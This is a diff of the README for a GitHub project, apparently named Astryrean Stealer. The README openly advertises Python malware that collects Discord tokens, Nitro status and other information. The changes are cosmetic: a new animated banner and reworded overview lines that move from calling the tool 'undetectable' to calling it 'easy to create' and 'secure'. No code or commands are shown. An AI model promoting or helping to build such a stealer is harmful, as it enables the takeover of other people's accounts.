@@ -8,7 +8,7 @@
     <img src="https://img.shields.io/github/stars/zakocord/Astryrean?color=b699ff&style=flat" alt="Stars">
   </p>
 
-  <h3 style="font-family: 'Arial', sans-serif; color: #b699ff;">🦠 Malware that collects Discord Token and other information made in Python</h3>
+  [![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&pause=1000&color=B699FF&width=435&lines=Malware+that+collects+Discord+Token+and+other+information+made+in+Python)](https://git.io/typing-svg)
 </div>
 
 ## 📚 Table of Contents
@@ -20,14 +20,15 @@
 - 6.[📕 Disclaimer](https://github.com/zakocord/Astryrean-Stealer#Disclaimer)
 
 ## 📖 Overview
-<p>🤡 The silliest undetectable stealer available on GitHub<p>
+<p>🕵️ Stealer, 100% open source and easy to create, downloadable on Github<p>
+<p>🛡️ Regularly updated and secure!<p>
 
 ## ✨ Feature
 
 - 🧠 **Code**
   - 🔹 Very simple code
 
-- 🕵️ **Steal Feature**
+- 💎 **Steal Feature**
   - 💬 **Discord**
     - 🔑 Token
     - 💎 Nitro
